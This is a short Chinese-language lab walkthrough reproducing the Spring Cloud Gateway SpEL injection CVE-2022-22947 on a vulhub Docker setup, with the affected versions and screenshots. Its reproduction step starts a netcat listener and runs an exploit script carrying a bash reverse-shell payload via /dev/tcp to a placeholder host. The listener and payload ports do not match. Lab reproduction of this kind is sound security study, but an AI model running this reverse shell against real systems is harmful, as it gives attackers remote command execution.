
## 0x00 环境搭建

  下载
  git clone https://github.com/vulhub/vulhub.git
  
  进入到spring文件夹内
  执行docker-compose up -d
  
## 0x01 介绍

  Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。
  
  近日VMware官方发布了Spring Cloud Gateway存在SPEL表达式注入漏洞CVE-2022-22947，可导致未授权远程命令执行漏洞。
  影响版本：
  Spring Cloud Gateway < 3.1.1
  Spring Cloud Gateway < 3.0.7
  Spring Cloud Gateway 其他已不再更新的版本
  
## 0x02 漏洞复现

   ![图片](https://user-images.githubusercontent.com/118274389/224453966-8001feba-4973-4871-990d-344b25e7bb30.png)
 监听
 nc -lnvp 2222
 ![图片](https://user-images.githubusercontent.com/118274389/224454036-ec895f35-7c3e-43a7-891d-8029f05c0380.png)

进行反弹

python3 cve-2022-22947.py http://192.168.16.142:8080/ "bash -c 'exec bash -i &>/dev/tcp/xx.xx.xx.xx/1234 <&1'"

![图片](https://user-images.githubusercontent.com/118274389/224454085-9907e1a2-0d47-43b0-bfd1-b33554cc1410.png)

  
